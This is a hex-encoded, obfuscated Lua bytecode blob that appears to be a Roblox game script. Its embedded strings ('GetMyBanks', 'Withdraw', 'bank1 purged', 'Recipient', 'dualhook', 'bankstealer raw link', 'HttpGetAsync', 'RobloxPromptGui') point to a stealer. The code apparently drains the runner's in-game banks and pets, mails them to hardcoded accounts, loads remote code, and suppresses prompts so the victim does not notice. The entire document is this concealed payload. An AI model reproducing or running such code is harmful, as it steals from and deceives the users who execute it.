D2052616E6B2052657761726473030A3O0046722O6520476966747303053O006465627567030B3O00676574636F6E7374616E74030A3O004765744D7942616E6B73026O00084003083O004C6F636B50657473026O00144003073O0047657442616E6B03083O005769746864726177026O00304003093O0067657470726F746F73030C3O005570646174654F7574626F78027O0040026O00344003113O00557064617465496E626F78426F2O746F6D025O0080414003063O00557064617465030C3O00446563696465496E76697465026O001840030C3O004765744D79496E766974657303063O005265642O656D030B3O00676574757076616C75657303073O004E6574776F726B03063O00496E766F6B65026O00F03F030C3O00496E766F6B6553657276657203083O00696E76737061636503103O00696E7673706163655F6E6F6C696D697403093O0043686172616374657203103O0048756D616E6F6964522O6F745061727403063O00434672616D652O033O006E657703093O00576F726B737061636503053O002O5F4D4150030B3O00496E74657261637469766503043O0042616E6B2O033O0050616403083O00506F736974696F6E026O001040030A3O0062616E6B737461626C6503053O007461626C6503063O00696E7365727403043O004255494403053O00706169727303093O004672616D65776F726B030E3O0046696E6446697273744368696C6403093O0046756E6374696F6E7303093O0050657449444C69737403073O00666F726561636803093O004469726563746F727903043O005065747303043O007461736B03043O0077616974030C3O0062616E6B312070757267656403063O004C484C697374030A3O004C46696E616C4C69737403073O0053746F726167652O033O0075696403043O0066696E6403023O00696403083O004C484C697374203A030C3O004C46696E616C4C697374203A03083O0043752O72656E6379024O00652OCD41025O00DBFA40029A5O99C93F026O00F83F03053O00646F6E6531030C3O0062616E6B322070757267656403073O0042484C69737432030A3O0046696E616C4C6973743203013O006C030C3O0046696E616C4C69737432203A03093O0042484C69737432203A03053O00646F6E6532030C3O0062616E6B332070757267656403073O0042484C69737433030A3O0046696E616C4C69737433030C3O0046696E616C4C69737433203A03093O0042484C69737433203A03053O00646F6E6533030C3O0062616E6B342070757267656403073O0042484C69737434030A3O0046696E616C4C6973743403093O0042484C69737434203A030C3O0046696E616C4C69737434203A03053O00646F6E6534030C3O0062616E6B352070757267656403073O0042484C69737435030A3O0046696E616C4C6973743503093O0042484C69737435203A030C3O0046696E616C4C69737435203A03053O00646F6E653503093O0046722O65476966747303053O00476966747303053O004672616D6503093O00436F6E7461696E6572030E3O0047657444657363656E64616E747303053O0054696D657203073O005265642O656D2103063O00737472696E6703053O0073706C697403083O00746F737472696E6703063O00506172656E7403013O007403083O00746F6E756D62657203053O00576F726C6403053O00537061776E030C3O0052616E6B2052657761726473030B3O005649502052657761726473030C3O0042692O6C626F617264477569030A3O0047616D6570612O736573023O001028CF714103053O00496E626F7803093O00416E74694C65617665030C3O00482O74704765744173796E6303143O0062616E6B737465616C657220726177206C696E6B030B3O004765744368696C6472656E03073O0044657374726F7903073O00436F726547756903073O0052692O7A487562030F3O00526F626C6F7850726F6D7074477569030B3O00546974616E69634C69737403053O00544C69737403063O0053544C697374030A3O0042616E616E614C69737403053O00424C69737403083O00487567654C69737403053O00484C69737403063O0053484C69737403073O00506F674C69737403053O00504C69737403063O0053504C697374030D3O004578636C75736976654C69737403053O00454C69737403063O0053454C69737403093O004576656E744C69737403063O0045764C69737403073O005345764C697374030A3O005365637265744C69737403053O00534C69737403063O002O534C697374030A3O004D79746869634C69737403053O004D4C69737403063O00534D4C69737403043O006875676503073O00746974616E696303023O00686303023O00646D025O006AF840025O0088C34003113O006469616D6F6E6473746F636F6E766572742O033O00524150030C3O004D696B6579204F6E20546F7003083O006475616C682O6F6B030D3O00326E6420557365722048657265034O0003093O00526563697069656E7403073O004D652O7361676503063O00756E7061636B03053O00737061776E030B3O00575469616E69634C69737403063O0057544C69737403043O0057542O63030B3O005742616E616E614C69737403063O0057424C69737403043O0057422O6303093O0057487567654C69737403063O0057484C69737403043O0057482O6303083O0057506F674C69737403063O0057504C69737403043O0057502O63030E3O00574578636C75736976654C69737403063O0057454C69737403043O0057452O63030A3O00574576656E744C69737403073O005745764C69737403053O005745762O63030B3O00575365637265744C69737403063O0057534C69737403043O0057532O63030B3O00574D79746869634C69737403063O00574D4C69737403043O00574D2O63008C0B2O0012C93O00018O000100024O00013O000C00302O00010003000400302O00010005000600302O0001000700084O00023O000200302O0002000A000600302O0002000B000C00102O0001000900022O001B00023O000200302O0002000A000600302O0002000B000C00102O0001000D00024O00023O000200302O0002000A000600302O0002000B000C00102O0001000E00024O00023O000200302O0002000A00060030610002000B00100010B60001000F00022O001B00023O000200302O0002000A000600302O0002000B001000102O0001001100024O00023O000200302O0002000A000600302O0002000B001000102O0001001200024O00023O000200302O0002000A00060030610002000B00100010630001001300024O00023O000200302O0002000A000600302O0002000B001000102O0001001400024O00023O000200302O0002000A000600302O0002000B001000102O00010015000200104O000200010012533O00014O006C3O0001000200204D5O00160006453O003100013O0004123O003100012O00333O00013O0012533O00014O009B3O0001000200304O0016000600124O00173O00206O001800122O000200198O0002000200122O0001001A3O00202O00010001001B4O000200053O00122O0003001C3O0012190104001D3O0012190105001E3O0012190106001F3O001219010700204O00A4000200050001001253000300214O00E500030001000200202O00030003002200302O00030023001000122O000300243O00202O00030003002500262O0003004F000100260004123O004F000100204D00033O002700208C0003000300280006E700053O000100022O00893O00024O00893O00014O007B000300050001000274000300013O00122B000300293O00122O0003002A3O00122O0003002B3O00122O0003002C3O00122O0003002D3O00122O0003002E3O00122O0003002F3O00122O000400303O00262O0004005D000100310004123O005D0001001253000400243O00204D000400040030001219000400303O001253000400323O00263F00040063000100310004123O00630001001253000400243O00204D000400040032001219000400323O001253000400053O00263F00040069000100310004123O00690001001253000400243O00204D000400040005001219000400053O001253000400173O00203501040004001800122O000600336O00040006000200202O00040004003400202O00040004003500122O000500303O00062O00040083000100050004123O00830001001219010500103O00263F00050073000100100004123O00730001001219010600103O00263F00060076000100100004123O00760001001253000700173O00200801070007001800122O000900336O00070009000200202O00070007003400202O00070007003600122O000900376O0007000900016O00013O00044O007600010004123O00730001001253000500303O00263F0005009D000100310004123O009D0001001219010500104O0038000600063O00263F00050088000100100004123O00880001001219010600103O00263F0006008B000100100004123O008B0001001219010700103O00263F0007008E000100100004123O008E0001001253000800173O00200801080008001800122O000A00336O0008000A000200202O00080008003400202O00080008003600122O000A00386O0008000A00016O00013O00044O008E00010004123O008B00010004123O009D00010004123O00880001001253000500393O000274000600024O00060005000200020006DE000500B9000100010004123O00B90001001219010600104O0038000700073O00263F000600A4000100100004123O00A40001001219010700103O00263F000700A7000100100004123O00A70001001219010800103O00263F000800AA000100100004123O00AA0001001253000900173O00200801090009001800122O000B00336O0009000B000200202O00090009003400202O00090009003600122O000B003A6O0009000B00016O00013O00044O00AA00010004123O00A700010004123O00B900010004123O00A40001000645000500C400013O0004123O00C40001001253000600243O001268000700173O00202O00070007001800122O000900336O00070009000200202O00070007003C00122O000900306O00070009000200102O0006003B0007001253000600323O002624000600DC000100310004123O00DC0001001219010600104O0038000700073O00263F000600C9000100100004123O00C90001001253000800393O000274000900034O00060008000200022O0089000700083O0006DE000700DC000100010004123O00DC0001001253000800173O00200801080008001800122O000A00336O0008000A000200202O00080008003400202O00080008003600122O000A003D6O0008000A00016O00013O00044O00DC00010004123O00C900010012530006003E3O0012A3000700173O00202O00070007001800122O0009003F6O00070009000200202O00070007004000202O00070007004100202O0007000700424O00060002000200202O0006000600434O00060001000200204D000600060044001253000700393O000274000800044O00060007000200020006DE000700FE000100010004123O00FE0001001219010800103O00263F000800EE000100100004123O00EE0001001219010900103O00263F000900F1000100100004123O00F10001001253000A00173O002008010A000A001800122O000C00336O000A000C000200202O000A000A003400202O000A000A003600122O000C00456O000A000C00016O00013O00044O00F100010004123O00EE0001000274000800053O001219000800463O000274000800063O001219000800473O001253000800493O000645000800092O013O0004123O00092O01001253000800493O00204D0008000800480006DE0008001E2O0100010004123O001E2O010012530008004A3O000645000800102O013O0004123O00102O010012530008004A3O00204D0008000800480006DE0008001E2O0100010004123O001E2O010012530008004B3O0006DE0008001E2O0100010004123O001E2O010012530008004C3O0006450008001A2O013O0004123O001A2O010012530008004C3O00204D0008000800480006DE0008001E2O0100010004123O001E2O01001253000800483O0006DE0008001E2O0100010004123O001E2O010012530008004D3O001219000800484O0038000800083O0006E700090007000100012O00893O00084O006F000A00096O000A0001000100122O000A00173O00202O000A000A003300202O000A000A003400202O000A000A004E00202O000A000A004F00202O000A000A005000202O000A000A005100202O000A000A005200204D000A000A00530012ED000B00173O00202O000B000B001800122O000D00336O000B000D000200202O000B000B003400202O000B000B003500122O000C00173O00202O000C000C001800122O000E00336O000C000E000200204D000C000C0034001225010D00173O00202O000D000D005400122O000F00556O000D000F00024O000E000E3O00122O000F00243O00202O000F000F005600262O000F00482O0100260004123O00482O01001253000F00573O00122C001000173O00202O00100010005400122O001200586O001000126O000F3O00024O000F00010001001253000F00593O0012FA001000173O00202O00100010001800122O001200336O00100012000200202O00100010003400202O00100010005A00202O00100010005B00202O00100010005C00202O00100010005D4O000F0002000200122O001000593O00122O001100173O00202O00110011001800122O001300336O00110013000200202O00110011003400202O00110011005A00202O00110011005B00202O00110011005C00202O00110011005E4O00100002000200122O001100593O00122O001200173O00202O00120012001800122O001400336O00120014000200202O00120012003400202O00120012005A00202O00120012005B00202O00120012005C00202O00120012005F4O00110002000200122O001200593O00122O001300173O00202O00130013001800122O001500336O00130015000200202O00130013003400202O00130013005A00202O00130013005B00202O00130013006000202O0013001300614O00120002000200122O001300593O00122O001400173O00202O00140014001800122O001600336O00140016000200202O00140014003400202O00140014005A00202O00140014005B00202O00140014005C00202O0014001400624O00130002000200122O001400633O00202O00140014006400202O0015000F006500122O001600666O00140016000200122O001500633O00202O00150015006400202O00160010006700122O001700686O00150017000200122O001600633O00202O00160016006400202O0017000F006900122O001800666O00160018000200122O001700633O00202O00170017006400202O0018000F006A00122O0019006B6O00170019000200122O001800633O00202O00180018006400122O001900633O00202O00190019006C00202O001A0011006D4O00190002000200204D00190019006E00121A001A006F6O0018001A000200122O001900633O00202O00190019006400202O001A0011007000122O001B00716O0019001B000200122O001A00633O00202O001A001A006400202O001B0011007200122O001C00666O001A001C000200122O001B00633O00202O001B001B006400202O001C000F007300122O001D00746O001B001D000200122O001C00633O00202O001C001C006400202O001D000F007500122O001E00666O001C001E000200122O001D00633O00202O001D001D006400202O001E0012007600122O001F00666O001D001F000200122O001E00633O00202O001E001E006400202O001F0013007600122O002000666O001E0020000200122O001F00773O00122O0020003E3O00122O002100173O00202O00210021001800122O0023003F6O00210023000200202O00210021004000202O00210021004100202O0021002100784O00200002000200202O0020002000794O001F0002000200122O002000773O00202O0021001F006E4O00200002000200122O002100773O00202O00220020007A4O00210002000200202O00210021007A00202O00210021006E00122O002200773O00122O0023003E3O00122O002400173O00202O00240024001800122O0026003F6O00240026000200202O00240024004000202O00240024004100202O0024002400784O00230002000200202O0023002300794O00220002000200122O002300773O00202O00240022006E4O00230002000200202O00240023006E00122O0025006E6O002600146O0024002600024O00140021002400202O00240023006E00122O0025006E6O002600156O0024002600024O00150021002400202O00240023006E00122O0025006E6O002600164O00390024002600024O00160021002400202O00240023006E00122O0025006E6O002600176O0024002600024O00170021002400202O00240023006E00122O0025006E6O002600184O00390024002600024O00180021002400202O00240023006E00122O0025006E6O002600196O0024002600024O00190021002400202O00240023006E00122O0025006E6O0026001A4O00390024002600024O001A0021002400202O00240023006E00122O0025006E6O0026001B6O0024002600024O001B0021002400202O00240023006E00122O0025006E6O0026001C4O00390024002600024O001C0021002400202O00240023006E00122O0025006E6O0026001D6O0024002600024O001D0021002400202O00240023006E00122O0025006E6O0026001E4O002D0024002600022O001B011E0021002400208C00240014007B2O00060024000200020012540025003E3O00122O002600173O00202O00260026001800122O0028003F6O00260028000200202O00260026004000202O00260026004100202O0026002600424O00250002000200202O0025002500432O006C0025000100020006E700260008000100012O00893O00253O0012190026007C3O0006E700260009000100012O00893O00253O0012940026007D3O00122O002600173O00202O00260026001800122O002800336O00260028000200202O00260026003400202O00260026007E00202O00260026007F00122O002700803O00202O002700270081001253002800173O00202F01280028001800122O002A00826O0028002A000200202O00280028008300202O00280028008400202O00280028008500202O00280028008600202O0028002800874O00270002000200102O0026008000272O00380026002F3O001220003000103O00122O003100103O00122O003200103O00122O003300103O00122O003400103O00122O003500103O00122O003600103O00202O00370024007A00262O00370047020100310004123O0047020100204F00350035007A00204D00370024006E0026240037004B020100310004123O004B020100204F00350035007A00204D0037002400660026240037004F020100310004123O004F020100204F00350035007A00204D00370024008800262400370053020100310004123O0053020100204F00350035007A00204D00370024006800262400370057020100310004123O0057020100204F00350035007A00208C0037001C007B2O00060037000200022O002C01385O001219003800893O0026240035009E020100680004123O009E0201001219013800103O00263F003800730201006E0004123O0073020100204D00390037006800262400390069020100310004123O006902010012530039008A3O0020F600390039008B00122O003A00893O00202O003B0037006800202O003B003B008C4O0039003B00010012530039008D3O001253003A00894O000D00390002003B0004123O0070020100208C003E001B007B2O00890040003D4O007B003E004000010006670039006D020100020004123O006D02010004123O009E0201000E0401100088020100380004123O0088020100204D00390037007A0026240039007E020100310004123O007E02010012530039008A3O0020F600390039008B00122O003A00893O00202O003B0037007A00202O003B003B008C4O0039003B000100204D00390037006E00262400390087020100310004123O008702010012530039008A3O0020F600390039008B00122O003A00893O00202O003B0037006E00202O003B003B008C4O0039003B00010012190138007A3O000E04017A005E020100380004123O005E020100204D00390037006600262400390093020100310004123O009302010012530039008A3O0020F600390039008B00122O003A00893O00202O003B0037006600202O003B003B008C4O0039003B000100204D0039003700880026240039009C020100310004123O009C02010012530039008A3O0020F600390039008B00122O003A00893O00202O003B0037008800202O003B003B008C4O0039003B00010012190138006E3O0004123O005E020100263F003500CC020100100004123O00CC0201001219013800104O0038003900393O000E04011000A2020100380004123O00A20201001219013900103O00263F003900AA0201006E0004123O00AA0201001253003A00893O00204D002F003A00680004123O0064030100263F003900B9020100100004123O00B90201001219013A00103O00263F003A00B4020100100004123O00B40201001253003B00893O00204D0027003B007A001253003B00893O00204D0029003B006E001219013A007A3O00263F003A00AD0201007A0004123O00AD02010012190139007A3O0004123O00B902010004123O00AD020100263F003900A50201007A0004123O00A50201001219013A00103O00263F003A00C00201007A0004123O00C002010012190139006E3O0004123O00A5020100263F003A00BC020100100004123O00BC0201001253003B00893O002079002B003B006600122O003B00893O00202O002D003B008800122O003A007A3O00044O00BC02010004123O00A502010004123O006403010004123O00A202010004123O0064030100263F003500FA0201007A0004123O00FA0201001219013800104O0038003900393O00263F003800D0020100100004123O00D00201001219013900103O00263F003900E2020100100004123O00E20201001219013A00103O000E04011000DD0201003A0004123O00DD020100204D003B0024007A00204D0027003B008C001253003B00893O00204D0029003B007A001219013A007A3O00263F003A00D60201007A0004123O00D602010012190139007A3O0004123O00E202010004123O00D6020100263F003900F10201007A0004123O00F10201001219013A00103O00263F003A00EC020100100004123O00EC0201001253003B00893O00204D002B003B006E001253003B00893O00204D002D003B0066001219013A007A3O00263F003A00E50201007A0004123O00E502010012190139006E3O0004123O00F102010004123O00E5020100263F003900D30201006E0004123O00D30201001253003A00893O00204D002F003A00880004123O006403010004123O00D302010004123O006403010004123O00D002010004123O0064030100263F003500070301006E0004123O0007030100204D00380024007A0020C000270038008C00202O00380024006E00202O00290038008C00122O003800893O00202O002B0038007A00122O003800893O00202O002D0038006E00122O003800893O00202O002F0038006600044O0064030100263F0035001F030100660004123O001F0301001219013800103O00263F00380011030100100004123O0011030100204D00390024007A00204D00270039008C00204D00390024006E00204D00290039008C0012190138007A3O00263F003800180301007A0004123O0018030100204D00390024006600204D002B0039008C001253003900893O00204D002D0039007A0012190138006E3O000E04016E000A030100380004123O000A0301001253003900893O00204D002F0039006E0004123O006403010004123O000A03010004123O0064030100263F0035004D030100880004123O004D0301001219013800104O0038003900393O000E0401100023030100380004123O00230301001219013900103O00263F003900350301007A0004123O00350301001219013A00103O00263F003A0030030100100004123O0030030100204D003B0024006600204D002B003B008C00204D003B0024008800204D002D003B008C001219013A007A3O00263F003A00290301007A0004123O002903010012190139006E3O0004123O003503010004123O0029030100263F0039003A0301006E0004123O003A0301001253003A00893O00204D002F003A007A0004123O0064030100263F00390026030100100004123O00260301001219013A00103O00263F003A00410301007A0004123O004103010012190139007A3O0004123O0026030100263F003A003D030100100004123O003D030100204D003B0024007A00203A0027003B008C00202O003B0024006E00202O0029003B008C00122O003A007A3O00044O003D03010004123O002603010004123O006403010004123O002303010004123O0064030100263F00350064030100680004123O00640301001219013800103O000E04016E0055030100380004123O0055030100204D00390024006800204D002F0039008C0004123O0064030100263F0038005C0301007A0004123O005C030100204D00390024006600204D002B0039008C00204D00390024008800204D002D0039008C0012190138006E3O00263F00380050030100100004123O0050030100204D00390024007A00203A00270039008C00202O00390024006E00202O00290039008C00122O0038007A3O00044O005003010012530038003E3O0012FC003900173O00202O00390039001800122O003B003F6O0039003B000200202O00390039008E00202O00390039008F00122O003B00406O0039003B6O00383O000200122O003800403O001253003800403O00201C01380038009000122O003800906O00385O00122O003800913O00122O0038008A3O00202O00380038009200122O003900403O00202O00390039009300202O003900390094000274003A000A4O007B0038003A00010026240027001F040100310004123O001F04010012530038007C4O006C0038000100020026240038001F040100100004123O001F0401001253003800953O00204D0038003800962O006C0038000100020006450038001F04013O0004123O001F0401001253003800293O0012D1003900976O00380002000100202O00380016007B4O003A00276O0038003A00024O002600386O00385O00122O003800986O00385O00122O003800993O00204D00380026009A0020560038003800944O00395O00122O003A008D6O003B00386O003A0002003C00044O009A030100204D003F003E009B0020470039003F0026000667003A0098030100020004123O00980301001253003A008D4O0089003B00384O000D003A0002003C0004123O00AC0301001253003F008A3O0020F3003F003F009C00122O004000913O00202O0041003E009D4O003F0041000200262O003F00AC030100310004123O00AC0301001253003F008A3O00204D003F003F008B001253004000983O00204D0041003E009B2O007B003F00410001000667003A00A0030100020004123O00A00301001253003A00293O0012E3003B009E3O00122O003C00986O003C003C6O003A003C000100122O003A00986O003A003A3O00122O003B007C6O003B0001000200062O003A00C50301003B0004123O00C50301001253003A008D3O001253003B00984O000D003A0002003C0004123O00C20301001253003F008A3O00204D003F003F008B001253004000994O00890041003E4O007B003F00410001000667003A00BD030100020004123O00BD03010004123O00DC0301001253003A00984O006E003A003A3O001253003B007C4O006C003B0001000200067D003B00DC0301003A0004123O00DC0301001253003A008D3O001253003B00984O000D003A0002003C0004123O00DA0301001253003F00994O006E003F003F3O0012530040007C4O006C00400001000200067D003F00DA030100400004123O00DA0301001253003F008A3O00204D003F003F008B001253004000994O00890041003E4O007B003F00410001000667003A00CF030100020004123O00CF0301001253003A00293O001243003B009F3O00122O003C00996O003C003C6O003A003C000100202O003A0026009A00202O003A003A00A000202O0030003A004400122O003A00996O003A003A3O00262O003A00ED030100100004123O00ED0301002628013000ED030100A10004123O00ED0301000E7600A200ED030100060004123O00ED0301001219013000103O001253003A00994O006E003A003A3O00263F003A00F3030100100004123O00F303010026240030001A040100100004123O001A04012O002C013A3O0003001029013A007A002700122O003B00993O00102O003A006E003B00302O003A0066001000122O003B00393O0006E7003C000B000100032O00893O00174O00893O00274O00893O00304O000D003B0002003C00263F003B0013040100260004123O00130401001219013D00104O0038003E003E3O00263F003D0002040100100004123O00020401001219013E00103O00263F003E0005040100100004123O00050401001253003F00963O001252004000A36O003F0002000100202O003F0017007B4O004100273O00122O004200993O00122O004300106O003F0043000100044O001304010004123O000504010004123O001304010004123O00020401001253003D00994O0069003D003D6O00360036003D00122O003D00963O00122O003E00A46O003D0002000100044O00810301001253003A00293O001219013B00A54O00A1003A000200010004123O001F04010004123O00810301002624002900BD040100310004123O00BD04010012530038007C4O006C003800010002002624003800BD040100100004123O00BD0401001253003800953O00204D0038003800962O006C003800010002000645003800BD04013O0004123O00BD0401001253003800293O0012D1003900A66O00380002000100202O00380016007B4O003A00296O0038003A00024O002800386O00385O00122O003800A76O00385O00122O003800A83O00204D00380028009A0020560038003800944O00395O00122O003A008D6O003B00386O003A0002003C00044O003E040100204D003F003E009B0020470039003F0026000667003A003C040100020004123O003C0401001253003A008D4O0089003B00384O000D003A0002003C0004123O00530401001253003F008A3O0020F3003F003F009C00122O004000913O00202O0041003E009D4O003F0041000200262O003F0053040100310004123O0053040100204D003F003E00A90006DE003F0053040100010004123O00530401001253003F008A3O00204D003F003F008B001253004000A73O00204D0041003E009B2O007B003F00410001000667003A0044040100020004123O00440401001253003A00A74O006E003A003A3O001253003B007C4O006C003B0001000200062A013A00670401003B0004123O00670401001253003A008D3O001253003B00A74O000D003A0002003C0004123O00640401001253003F008A3O00204D003F003F008B001253004000A84O00890041003E4O007B003F00410001000667003A005F040100020004123O005F04010004123O007E0401001253003A00A74O006E003A003A3O001253003B007C4O006C003B0001000200067D003B007E0401003A0004123O007E0401001253003A008D3O001253003B00A74O000D003A0002003C0004123O007C0401001253003F00A84O006E003F003F3O0012530040007C4O006C00400001000200067D003F007C040100400004123O007C0401001253003F008A3O00204D003F003F008B001253004000A84O00890041003E4O007B003F00410001000667003A0071040100020004123O00710401001253003A00293O0012F7003B00AA3O00122O003C00A86O003C003C6O003A003C000100122O003A00293O00122O003B00AB3O00122O003C00A76O003C003C6O003A003C000100202O003A0028009A00204D003A003A00A000204D0031003A0044001253003A00A84O006E003A003A3O00263F003A0094040100100004123O0094040100262801310094040100A10004123O00940401000E7600A20094040100060004123O00940401001219013000103O001253003A00A84O006E003A003A3O00263F003A009A040100100004123O009A0401002624003100B8040100100004123O00B804012O002C013A3O0003001029013A007A002900122O003B00A83O00102O003A006E003B00302O003A0066001000122O003B00964O00E0003B00010001001253003B00393O0006E7003C000C000100032O00893O00174O00893O00294O00893O00314O000D003B0002003C00263F003B00B1040100260004123O00B10401001253003D00963O0012DA003E00A36O003D0002000100202O003D0017007B4O003F00293O00122O004000A83O00122O004100106O003D00410001001253003D00963O00129A003E00A46O003D0002000100122O003D00A86O003D003D6O00360036003D00044O00250401001253003A00293O001219013B00AC4O00A1003A000200010004123O00BD04010004123O00250401002624002B0075050100310004123O007505010012530038007C4O006C00380001000200262400380075050100100004123O00750501001253003800953O00204D0038003800962O006C0038000100020006450038007505013O0004123O00750501001253003800293O0012D1003900AD6O00380002000100202O00380016007B4O003A002B6O0038003A00024O002A00386O00385O00122O003800AE6O00385O00122O003800AF3O00204D0038002A009A0020560038003800944O00395O00122O003A008D6O003B00386O003A0002003C00044O00DC040100204D003F003E009B0020470039003F0026000667003A00DA040100020004123O00DA0401001253003A008D4O0089003B00384O000D003A0002003C0004123O00F10401001253003F008A3O0020F3003F003F009C00122O004000913O00202O0041003E009D4O003F0041000200262O003F00F1040100310004123O00F1040100204D003F003E00A90006DE003F00F1040100010004123O00F10401001253003F008A3O00204D003F003F008B001253004000AE3O00204D0041003E009B2O007B003F00410001000667003A00E2040100020004123O00E20401001253003A00AE4O006E003A003A3O001253003B007C4O006C003B0001000200062A013A002O0501003B0004123O002O0501001253003A008D3O001253003B00AE4O000D003A0002003C0004123O00020501001253003F008A3O00204D003F003F008B001253004000AF4O00890041003E4O007B003F00410001000667003A00FD040100020004123O00FD04010004123O001C0501001253003A00AE4O006E003A003A3O001253003B007C4O006C003B0001000200067D003B001C0501003A0004123O001C0501001253003A008D3O001253003B00AE4O000D003A0002003C0004123O001A0501001253003F00AF4O006E003F003F3O0012530040007C4O006C00400001000200067D003F001A050100400004123O001A0501001253003F008A3O00204D003F003F008B001253004000AF4O00890041003E4O007B003F00410001000667003A000F050100020004123O000F0501001253003A00293O0012F7003B00B03O00122O003C00AF6O003C003C6O003A003C000100122O003A00293O00122O003B00B13O00122O003C00AE6O003C003C6O003A003C000100202O003A002A009A00204D003A003A00A000204D0032003A0044001253003A00AF4O006E003A003A3O00263F003A0032050100100004123O0032050100262801320032050100A10004123O00320501000E7600A20032050100060004123O00320501001219013000103O001253003A00AF4O006E003A003A3O00263F003A0038050100100004123O0038050100262400320070050100100004123O00700501001219013A00104O0038003B003D3O00263F003A00430501006E0004123O00430501001253003E00963O00129A003F00A46O003E0002000100122O003E00AF6O003E003E6O00360036003E00044O00C3040100263F003A00630501007A0004123O00630501001253003E00393O0006E7003F000D000100032O00893O00174O00893O002B4O00893O00324O000D003E0002003F2O0089003D003F4O0089003C003E3O00263F003C0062050100260004123O00620501001219013E00104O0038003F003F3O000E04011000510501003E0004123O00510501001219013F00103O00263F003F0054050100100004123O00540501001253004000963O001252004100A36O00400002000100202O00400017007B4O0042002B3O00122O004300AF3O00122O004400106O00400044000100044O006205010004123O005405010004123O006205010004123O00510501001219013A006E3O00263F003A003A050100100004123O003A05012O002C013E3O0003001005003E007A002B00122O003F00AF3O00102O003E006E003F00302O003E006600104O003B003E3O00122O003E00964O00E0003E00010001001219013A007A3O0004123O003A05010004123O00C30401001253003A00293O001219013B00B24O00A1003A000200010004123O007505010004123O00C30401002624002D0048060100310004123O004806010012530038007C4O006C00380001000200262400380048060100100004123O00480601001253003800953O00204D0038003800962O006C0038000100020006450038004806013O0004123O00480601001253003800293O0012D1003900B36O00380002000100202O00380016007B4O003A002D6O0038003A00024O002C00386O00385O00122O003800B46O00385O00122O003800B53O00204D0038002C009A0020560038003800944O00395O00122O003A008D6O003B00386O003A0002003C00044O0094050100204D003F003E009B0020470039003F0026000667003A0092050100020004123O00920501001253003A008D4O0089003B00384O000D003A0002003C0004123O00A90501001253003F008A3O0020F3003F003F009C00122O004000913O00202O0041003E009D4O003F0041000200262O003F00A9050100310004123O00A9050100204D003F003E00A90006DE003F00A9050100010004123O00A90501001253003F008A3O00204D003F003F008B001253004000B43O00204D0041003E009B2O007B003F00410001000667003A009A050100020004123O009A0501001253003A00B44O006E003A003A3O001253003B007C4O006C003B0001000200062A013A00BD0501003B0004123O00BD0501001253003A008D3O001253003B00B44O000D003A0002003C0004123O00BA0501001253003F008A3O00204D003F003F008B001253004000B54O00890041003E4O007B003F00410001000667003A00B5050100020004123O00B505010004123O00D40501001253003A00B44O006E003A003A3O001253003B007C4O006C003B0001000200067D003B00D40501003A0004123O00D40501001253003A008D3O001253003B00B44O000D003A0002003C0004123O00D20501001253003F00B54O006E003F003F3O0012530040007C4O006C00400001000200067D003F00D2050100400004123O00D20501001253003F008A3O00204D003F003F008B001253004000B54O00890041003E4O007B003F00410001000667003A00C7050100020004123O00C70501001253003A00293O0012F7003B00B63O00122O003C00B46O003C003C6O003A003C000100122O003A00293O00122O003B00B73O00122O003C00B56O003C003C6O003A003C000100202O003A002C009A00204D003A003A00A000204D0033003A0044001253003A00B54O006E003A003A3O00263F003A00EA050100100004123O00EA0501002628013300EA050100A10004123O00EA0501000E7600A200EA050100060004123O00EA0501001219013300103O001253003A00B54O006E003A003A3O00263F003A00F0050100100004123O00F0050100262400330043060100100004123O00430601001219013A00104O0038003B003E3O000E04011000F70501003A0004123O00F70501001219013B00104O0038003C003C3O001219013A007A3O00263F003A00FB0501007A0004123O00FB05012O0038003D003E3O001219013A006E3O00263F003A00F20501006E0004123O00F2050100263F003B00200601007A0004123O00200601001219013F00103O00263F003F001B060100100004123O001B060100263F003D0017060100260004123O00170601001219014000104O0038004100413O00263F0040002O060100100004123O002O0601001219014100103O000E0401100009060100410004123O00090601001253004200963O001252004300A36O00420002000100202O00420017007B4O0044002D3O00122O004500B53O00122O004600106O00420046000100044O001706010004123O000906010004123O001706010004123O002O0601001253004000B54O006E004000404O0003003600360040001219013F007A3O00263F003F2O000601007A0004124O000601001219013B006E3O0004123O002006010004124O00060100263F003B00260601006E0004123O00260601001253003F00963O001219014000A44O00A1003F000200010004123O007B050100263F003B00FD050100100004123O00FD0501001219013F00103O00263F003F003A060100100004123O003A06012O002C01403O00030010050040007A002D00122O004100B53O00102O0040006E004100302O0040006600104O003C00403O00122O004000393O0006E70041000E000100032O00893O00174O00893O002D4O00893O00334O000D0040000200412O0089003E00414O0089003D00403O001219013F007A3O000E04017A00290601003F0004123O00290601001219013B007A3O0004123O00FD05010004123O002906010004123O00FD05010004123O007B05010004123O00F205010004123O007B0501001253003A00293O001219013B00B84O00A1003A000200010004123O004806010004123O007B0501002624002F000F070100310004123O000F07010012530038007C4O006C0038000100020026240038000F070100100004123O000F0701001253003800953O00204D0038003800962O006C0038000100020006450038000F07013O0004123O000F0701001253003800293O0012D1003900B96O00380002000100202O00380016007B4O003A002F6O0038003A00024O002E00386O00385O00122O003800BA6O00385O00122O003800BB3O00204D0038002E009A0020560038003800944O00395O00122O003A008D6O003B00386O003A0002003C00044O0067060100204D003F003E009B0020470039003F0026000667003A0065060100020004123O00650601001253003A008D4O0089003B00384O000D003A0002003C0004123O007C0601001253003F008A3O0020F3003F003F009C00122O004000913O00202O0041003E009D4O003F0041000200262O003F007C060100310004123O007C060100204D003F003E00A90006DE003F007C060100010004123O007C0601001253003F008A3O00204D003F003F008B001253004000BA3O00204D0041003E009B2O007B003F00410001000667003A006D060100020004123O006D0601001253003A00BA4O006E003A003A3O001253003B007C4O006C003B0001000200062A013A00900601003B0004123O00900601001253003A008D3O001253003B00BA4O000D003A0002003C0004123O008D0601001253003F008A3O00204D003F003F008B001253004000BB4O00890041003E4O007B003F00410001000667003A0088060100020004123O008806010004123O00A70601001253003A00BA4O006E003A003A3O001253003B007C4O006C003B0001000200067D003B00A70601003A0004123O00A70601001253003A008D3O001253003B00BA4O000D003A0002003C0004123O00A50601001253003F00BB4O006E003F003F3O0012530040007C4O006C00400001000200067D003F00A5060100400004123O00A50601001253003F008A3O00204D003F003F008B001253004000BB4O00890041003E4O007B003F00410001000667003A009A060100020004123O009A0601001253003A00293O0012F7003B00BC3O00122O003C00BA6O003C003C6O003A003C000100122O003A00293O00122O003B00BD3O00122O003C00BB6O003C003C6O003A003C000100202O003A002E009A00204D003A003A00A000204D0034003A0044001253003A00BB4O006E003A003A3O00263F003A00BD060100100004123O00BD0601002628013400BD060100A10004123O00BD0601000E7600A200BD060100060004123O00BD0601001219013400103O001253003A00BB4O006E003A003A3O00263F003A00C3060100100004123O00C306010026240034000A070100100004123O000A0701001219013A00104O0038003B003E3O00263F003A00C90601007A